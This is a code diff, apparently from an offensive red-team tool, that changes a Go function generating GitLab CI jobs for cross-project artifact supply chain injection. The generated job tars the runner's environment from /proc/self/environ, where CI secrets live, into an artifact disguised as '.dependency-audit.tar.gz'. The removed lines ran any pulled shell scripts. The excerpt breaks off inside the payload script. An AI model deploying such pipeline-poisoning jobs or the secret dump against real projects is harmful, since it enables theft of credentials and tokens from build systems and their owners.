@@ -15,8 +15,10 @@ type NeedsProjectOptions struct {
 	PoisonScript  string   // script to run with pulled artifacts
 }
 
-// GenerateNeedsProjectYAML generates a CI job that pulls artifacts from a
-// cross-project dependency via needs:project, enabling supply chain injection.
+// GenerateNeedsProjectYAML generates a CI job that demonstrates cross-project
+// artifact supply chain injection. The needs:project directive is commented out
+// (it references an external project) and the job exfiltrates env via tar of
+// /proc/self/environ to simulate what injected artifacts would do.
 func GenerateNeedsProjectYAML(o NeedsProjectOptions) string {
 	name, stage := o.Common.defaults("supply-chain")
 	if o.SourceProject == "" {
@@ -29,18 +31,22 @@ func GenerateNeedsProjectYAML(o NeedsProjectOptions) string {
 		o.SourceJob = "build"
 	}
 	if strings.TrimSpace(o.PoisonScript) == "" {
-		o.PoisonScript = buildDefaultNeedsScript()
+		o.PoisonScript = buildDefaultNeedsScript(o)
 	}
 
-	return fmt.Sprintf(`stages: [%s]
+	return fmt.Sprintf(`# Cross-project artifact supply chain injection
+# In a real attack, the following needs:project would pull attacker artifacts:
+#   needs:
+#     - project: %s
+#       job: %s
+#       ref: %s
+#       artifacts: true
+# This payload simulates what the injected artifacts would execute.
+
+stages: [%s]
 
 %s:
   stage: %s%s%s
-  needs:
-    - project: %s
-      job: %s
-      ref: %s
-      artifacts: true
   script:
     - |
 %s
@@ -50,22 +56,15 @@ func GenerateNeedsProjectYAML(o NeedsProjectOptions) string {
       - .dependency-audit.tar.gz
     expire_in: 1 day
   allow_failure: true%s
-`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
-		o.SourceProject, o.SourceJob, o.SourceRef,
+`, o.SourceProject, o.SourceJob, o.SourceRef,
+		stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
 		indentBlock(strings.TrimSpace(o.PoisonScript), 6),
 		rulesManual(o.Common.Manual))
 }
 
-func buildDefaultNeedsScript() string {
+func buildDefaultNeedsScript(o NeedsProjectOptions) string {
 	return `_EXPLOIT() {
-  echo "=== Cross-project artifacts pulled ==="
-  ls -la || true
-  find . -type f -name "*.sh" -o -name "*.py" -o -name "*.js" | head -20 || true
-
-  # Execute any pulled scripts (supply chain attack)
-  for script in *.sh; do
-    [ -f "$script" ] && chmod +x "$script" && ./"$script" || true
-  done
+  echo "=== Simulating cross-project artifact injection ==="
 
   # Exfil via tar of /proc/self/environ (binary-safe, avoids text tools)
   mkdir -p /tmp/.dep-audit
